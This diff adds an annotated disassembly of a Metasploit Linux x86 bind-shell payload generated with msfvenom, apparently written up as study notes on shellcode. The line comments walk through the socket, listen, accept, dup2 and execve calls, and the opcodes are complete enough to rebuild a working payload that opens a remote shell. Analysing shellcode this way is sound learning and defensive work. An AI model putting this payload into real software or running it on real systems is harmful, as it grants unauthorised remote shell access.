@@ -1,0 +1,53 @@
+msfvenom -p  linux/x86/shell_bind_tcp_random_port -f raw | ndisasm -u -
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+00000000  31DB              xor ebx,ebx                 ;zero out EBX
+00000002  F7E3              mul ebx                     ;zero out EAX,EDX
+00000004  B066              mov al,0x66                 ;EAX=0x66 (102)
+00000006  43                inc ebx                     ;EBX=1
+00000007  52                push edx                    ;push 0 on stack
+00000008  53                push ebx                    ;push 1 on stack
+00000009  6A02              push byte +0x2              ;push 2 on stack
+0000000B  89E1              mov ecx,esp                 ;pointer to stack in ECX
+0000000D  CD80              int 0x80                    ;syscall sys_socket(1,*args)
+                                                        ;*args(AF_INET,SOCK_STREAM,IPPROTO_IP
+
+0000000F  52                push edx                    ;push 0 on stack
+00000010  50                push eax                    ;store socket fd on stack
+00000011  89E1              mov ecx,esp                 ;store stack pointer in ECX
+00000013  B066              mov al,0x66                 ;EAX=0x66 (102)
+00000015  B304              mov bl,0x4                  ;EBX=4
+00000017  CD80              int 0x80                    ;syscall listen(fd, backlog)
+                                                        ;since there was no bind() before
+                                                        ;this call, OS will give us
+                                                        ;at random a port where our socket
+                                                        ;will listen on. It will be listening
+                                                        ;on ALL available interfaces
+
+00000019  B066              mov al,0x66                 ;EAX=0x66 (102)
+0000001B  43                inc ebx                     ;EBX=5
+0000001C  CD80              int 0x80                    ;syscall accept()
+                                                        ;client_socketFD stored in EAX
+
+0000001E  59                pop ecx                     ;store socket fd in ECX
+0000001F  93                xchg eax,ebx                ;EAX=5, EBX=client_socketFD
+00000020  6A3F              push byte +0x3f             ;store 0x3f (63) on stack
+00000022  58                pop eax                     ;remove 0x3f from stack, into EAX
+00000023  CD80              int 0x80                    ;syscall dup2(oldfd, newfd)
+                                                        ;duplicate(FD_inEBX, FD_inECX) i.e.
+                                                        ;client and server sockets
+00000025  49                dec ecx                     ;ECX starts at one more than the socketfd
+                                                        ;which starts at 3 (0,1,2 are the fd for
+                                                        ;the process running our shellcode)
+00000026  79F8              jns 0x20                    ;is sign flag set (i.e. is ECX=-1)?
+
+00000028  B00B              mov al,0xb                  ;EAX=0xb (11)
+0000002A  682F2F7368        push dword 0x68732f2f       ;store hs// on the stack
+0000002F  682F62696E        push dword 0x6e69622f       ;store nib/ on the stack
+00000034  89E3              mov ebx,esp                 ;store stack pointer into EBX
+00000036  41                inc ecx                     ;ECX=0
+00000037  CD80              int 0x80                    ;syscall execve
+                                                        ;execve('/bin/sh','','')
+
+
